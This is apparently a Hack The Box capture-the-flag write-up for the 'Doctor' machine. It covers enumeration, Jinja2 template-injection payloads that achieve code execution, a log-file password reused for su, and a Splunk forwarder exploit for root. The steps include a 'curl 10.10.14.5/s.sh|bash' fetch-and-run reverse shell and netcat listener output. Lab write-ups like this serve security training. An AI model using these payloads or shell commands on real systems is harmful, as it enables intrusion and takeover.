---
layout: post
title: "Hack The Box - Doctor Writeup"
author: Chr0x6eOs
date: "2021-02-06"
subject: "Box Writeup"
keywords: [HTB, CTF, Hack The Box, Security, Chr0x6eOs, Linux, SSTI, Python, RCE, splunk]
lang: "en"
image:
    path: assets/htb/Doctor/logo.png
    width: 300
    height: 300
...

![Doctor](/assets/htb/Doctor/doctor.png)

[Doctor](https://www.hackthebox.eu/home/machines/profile/278) is an easy linux box by [egotisticalSW](https://www.hackthebox.eu/home/users/profile/94858). 

### Overview

The box starts with web enumeration, where we find a server-side template injection vulnerability that allows us to gain code-execution on the system. Using the RCE, we get a shell as the web user on the system.

As the web user is part of the adm group, we can log-files. Searching through the apache2-logfiles directory, we find a backup-file containing credentials. Using these credentials we can su to user and read user.txt.

Checking out the system, we can find the installed version of splunk is vulnerable to arbitrary code-execution. Exploiting the vulnerability, we get code-execution as root and can read root.txt.

## Information Gathering

### Nmap
We begin our enumeration with a nmap scan for open ports.

```bash
root@darkness:~# nmap -sC -sV 10.10.10.209
Nmap scan report for 10.10.10.209
Host is up (0.38s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

The open ports shown are **22** (ssh), **80** (http) and **8089** (splunkd). Let us start with http, as ssh usually is not that interesting without credentials.

### HTTP - Port 80

Going to http://10.10.10.209, we get presented with following page.

![Index webpage](/assets/htb/Doctor/http/index-webpage.png)

Looking at the index-webpage, we can spot an email address: `info@doctors.htb`. Let us add `doctors.htb` to our `/etc/hosts` file and see if there is a VHost listening on the hostname.

```bash
root@darkness:~# tail -n 1 /etc/hosts
10.10.10.209    doctors.htb
```

Going to http://doctors.htb, we get shown following page:

![Login webpage](/assets/htb/Doctor/http/login-webpage.png)

Let us create an account and see what hides behind the login page.

![Registering an account](/assets/htb/Doctor/http/register-webpage.png)

After registering an account, we can login.

![Logging in](/assets/htb/Doctor/http/login-webpage-2.png)

After login, we get redirected to /home.

![Home webpage](/assets/htb/Doctor/http/home-webpage.png)

We are able to create a new message or manage our account. The account management does not seem interesting, so let us try to create a new message.

![New message](/assets/htb/Doctor/http/newmsg-webpage.png)

After creating a new message, we get redirected to home, where our message is now being shown.

![Message being shown](/assets/htb/Doctor/http/msgshown-webpage.png)

As the content of our messages are being displayed, I am thinking about a couple of possible vulnerability, especially Template Injection.

### Testing for Server-side template injection

When testing for Template Injection, I always go back to [PortSwigger's Server-side template injection article](https://portswigger.net/web-security/server-side-template-injection).

Especially this image is very helpful:

![Testing template injection](https://portswigger.net/web-security/images/template-decision-tree.png)

We can now simply go down this decision tree.

![Template injection test 1](/assets/htb/Doctor/http/ssti/injection-test-1.png)

![Template injection result 1](/assets/htb/Doctor/http/ssti/result-1.png)

Seems like we are going to follow the lower-path.

![Template injection test 2](/assets/htb/Doctor/http/ssti/injection-test-2.png)

![Template injection result 2](/assets/htb/Doctor/http/ssti/result-2.png)

Seems like the target is not vulnerable to Template injection. Let us further enumerate the webpage with a gobuster to find more endpoints to enumerate.

```bash
root@darkness:~# gobuster dir -u http://doctors.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://doctors.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/01/13 11:50:58 Starting gobuster in directory enumeration mode
===============================================================
/home (Status: 302)          
/login (Status: 200)         
/archive (Status: 200)       
/register (Status: 200)      
/account (Status: 302)
```

We get a new interesting endpoint that weren't shown in the menu tabs: `/archive`.

Going to http://doctors.htb/archive, we get an empty page, however looking at the source code we get following output:

```xml
	<?xml version="1.0" encoding="UTF-8" ?>
	<rss version="2.0">
	<channel>
 	<title>Archive</title>
 	<item><title>Test</title></item>

			</channel>
			<item><title>${7*7}</title></item>

			</channel>
			<item><title>49</title></item>

			</channel>
```

Interestingly, we have `49` as one of the items, instead of our payload, which means that the `/archive` endpoint is vulnerable to Server-side Template injection.

Let us continue our SSTI enumeration, by testing the final payload: 

```python
{{ "{{ 7*'7' " }}}}
```

As a result we get following XML:

```xml
<?xml version="1.0" encoding="UTF-8" ?>
	<rss version="2.0">
	<channel>
 	<title>Archive</title>
 	<item><title>test</title></item>

			</channel>
			<item><title>7777777</title></item>

			</channel>
```

Seems like our Templating engine is either `Twig` or `Jinja2`.

We can now use the [PayloadAllTheThings Repo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection) and check the [Twig](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig) and the [Jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2) injections and see what works.

#### Finding templating engine

Let us test for Twig first, by trying following payload:

```python
{{ "{{ dump(app) " }}}}
```

This results into following response on /archive:

![Server error](/assets/htb/Doctor/http/ssti/500-error.png)

Seems like we did cause some error on the server with this payload. Let us try a Jinja2 payload next:

```python
{{ "{{ config.items() " }}}}
```

As a response we get following data:

```python
<?xml version="1.0" encoding="UTF-8" ?>
	<rss version="2.0">
	<channel>
 	<title>Archive</title>
 	<item><title>dict_items([('ENV', 'production'), ('DEBUG', False), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('PRESERVE_CONTEXT_ON_EXCEPTION', None), ('SECRET_KEY', '1234'), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), ('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', False), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT', datetime.timedelta(seconds=43200)), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), ('JSON_AS_ASCII', True), ('JSON_SORT_KEYS', True), ('JSONIFY_PRETTYPRINT_REGULAR', False), ('JSONIFY_MIMETYPE', 'application/json'), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093), ('MAIL_PASSWORD', 'doctor'), ('MAIL_PORT', 587), ('MAIL_SERVER', ''), ('MAIL_USERNAME', 'doctor'), ('MAIL_USE_TLS', True), ('SQLALCHEMY_DATABASE_URI', 'sqlite://///home/web/blog/flaskblog/site.db'), ('WTF_CSRF_CHECK_DEFAULT', False), ('SQLALCHEMY_BINDS', None), ('SQLALCHEMY_NATIVE_UNICODE', None), ('SQLALCHEMY_ECHO', False), ('SQLALCHEMY_RECORD_QUERIES', None), ('SQLALCHEMY_POOL_SIZE', None), ('SQLALCHEMY_POOL_TIMEOUT', None), ('SQLALCHEMY_POOL_RECYCLE', None), ('SQLALCHEMY_MAX_OVERFLOW', None), ('SQLALCHEMY_COMMIT_ON_TEARDOWN', False), ('SQLALCHEMY_TRACK_MODIFICATIONS', None), ('SQLALCHEMY_ENGINE_OPTIONS', {})])</title></item>

			</channel>
```

Seems like our Jinja2 payload worked, which means that we can try for code-execution next.

## Remote Code execution

Let us try following Jinja2 payload for RCE:

```python
{{ "{{ config.__class__.__init__.__globals__['os'].popen('id').read()config.items() " }}}}
```

As a response, we get following data:

```xml
	<?xml version="1.0" encoding="UTF-8" ?>
	<rss version="2.0">
	<channel>
 	<title>Archive</title>
 	<item><title>uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
</title></item>

			</channel>
			
```

Seems like we are able to execute code on the system successfully. Let us try to get a shell next.

### Initial shell

For this we use following payload:

```python
{{ "{{ config.__class__.__init__.__globals__['os'].popen('curl 10.10.14.5/s.sh|bash').read() " }}}}
```

`s.sh` is a bash-reverse-shell payload.

We then start our http-server and send the payload.

```bash
root@darkness:~# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.209 - - [13/Jan/2021 14:34:04] "GET /s.sh HTTP/1.1" 200 -
```

We successfully get a request to our http-server and a response to our listener.

```bash
root@darkness:~# nc -lvnp 443
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.209.
Ncat: Connection from 10.10.10.209:53216.
bash: cannot set terminal process group (839): Inappropriate ioctl for device
bash: no job control in this shell
web@doctor:~$
```

### Bonus - Automation using Python

As automation is fun, I have created a [python exploit script](https://github.com/chr0x6eos/HTB/blob/master/Doctor/exploit.py) to exploit the SSTI (available on my [GitHub](https://github.com/chr0x6eos/HTB)).

## Privesc to user

Now that we have our initial shell, let us try to get access to a more privilege account.

### Enumeration as web

Let us begin our enumeration by checking the privileges of the web user.

```bash
web@doctor:~$ id
uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
```

Seems like we are part of the `adm` group, which is a privileged group that allows us to read log files in `/var/log`.

Let us search for interesting information in the log folder next.

```bash
web@doctor:/var/log/apache2$ ls -alh
total 4,1M
drwxr-x---  2 root adm    4,0K Jan 13 00:00 .
drwxrwxr-x 13 root syslog 4,0K Jan 13 00:00 ..
-rw-r-----  1 root adm    417K Jan 13 14:47 access.log
-rw-r-----  1 root adm    769K Jan 12 21:39 access.log.1
[...]
-rw-r-----  1 root adm     22K Sep 17 16:23 backup
-rw-r-----  1 root adm     726 Jan 13 14:47 error.log
-rw-r-----  1 root adm     897 Jan 13 00:00 error.log.1
```

Looking at the `/var/log/apache2` directory the file `backup` stands out to me. It does not seem to be a default file, which may mean that interesting information hides in it.

### Finding password in backup

Let us search for the term `password` in the file.

```bash
web@doctor:/var/log/apache2$ grep password backup 
10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
```

Seems like we have a possible password-candidate: `Guitar123`.

Let us read `/etc/passwd` to find all users on the system to try login to.

```bash
web@doctor:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
web:x:1001:1001:,,,:/home/web:/bin/bash
shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash
splunk:x:1003:1003:Splunk Server:/opt/splunkforwarder:/bin/bash
```

We have three users we can try to su to: `root`, `shaun` and `splunk`.

### Su to user

```bash
web@doctor:~$ su shaun
Password: Guitar123
shaun@doctor:/home/web$
```

We are able to su to shaun using the found password and can read user.txt.

```bash
shaun@doctor:~$ cat user.txt 
da611***************************
```

## Privesc - Root

Now that we have user, let us enumerate the system to find a privesc-vector to root.

### Enumeration as shaun

Remembering back to the nmap-scan (and the /etc/passwd), there seems to be splunk installed on the server.

Let us check out `/opt/splunkforwarder` next.

```bash
shaun@doctor:/opt/splunkforwarder$ ls -alh
total 180K
drwxr-xr-x  9 splunk splunk 4,0K Jan 12 20:04 .
drwxr-xr-x  4 root   root   4,0K Sep  6 17:56 ..
drwxr-xr-x  3 splunk splunk 4,0K Sep  6 17:56 bin
-r--r--r--  1 splunk splunk   57 Jul  8  2020 copyright.txt
drwxr-xr-x 13 splunk splunk 4,0K Jan 12 21:56 etc
drwxr-xr-x  2 splunk splunk 4,0K Sep  6 17:56 include
drwxr-xr-x  5 splunk splunk 4,0K Sep  6 17:56 lib
-r--r--r--  1 splunk splunk  84K Jul  8  2020 license-eula.txt
drwxr-xr-x  3 splunk splunk 4,0K Sep  6 17:56 openssl
-r--r--r--  1 splunk splunk  841 Jul  8  2020 README-splunk.txt
drwxr-xr-x  4 splunk splunk 4,0K Sep  6 17:56 share
-r--r--r--  1 splunk splunk  50K Jul  8  2020 splunkforwarder-8.0.5-a1a6394cc5ae-linux-2.6-x86_64-manifest
drwx--x---  6 root   root   4,0K Sep  6 17:57 var
```

Seems like `splunkforwarder Version 8.0.5` is installed on the system. Let us do a quick research and see if this version is vulnerable. A [Google search](https://www.google.com/search?&q=splunkforwarder+v8.0.5+exploit) returns [this article](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/), which explains that authenticated users can upload apps that run arbitrary code in the context of root.

### Exploiting splunk

The article refers to [PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2), which is a POC for this vulnerability.

Let us run the exploit-code and get a shell on the server as root.

```bash
root@darkness:~/SplunkWhisperer2/PySplunkWhisperer2# python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.5 --username shaun --password Guitar123 --payload "curl 10.10.14.5/s.sh|bash" 
```

The exploit uploads the malicious app and executes our payload. 

```bash
root@darkness:~# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.209 - - [13/Jan/2021 15:08:04] "GET /s.sh HTTP/1.1" 200 -
```

We successfully get a request on our http-server getting the bash payload. 

```bash
root@darkness:~# nc -lvnp 443
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.209.
Ncat: Connection from 10.10.10.209:53242.
bash: cannot set terminal process group (1137): Inappropriate ioctl for device
bash: no job control in this shell
root@doctor:/#
```

We successfully get a shell as root and can now read root.txt.

```bash
root@doctor:/root# cat root.txt 
421cd***************************
```
